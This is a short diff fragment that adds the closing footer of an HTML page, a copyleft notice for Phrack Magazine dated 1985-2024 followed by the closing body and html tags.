+<div align="right" class="texto-1">© Copyleft 1985-2024, Phrack Magazine.</div>
+</body>
+</html>
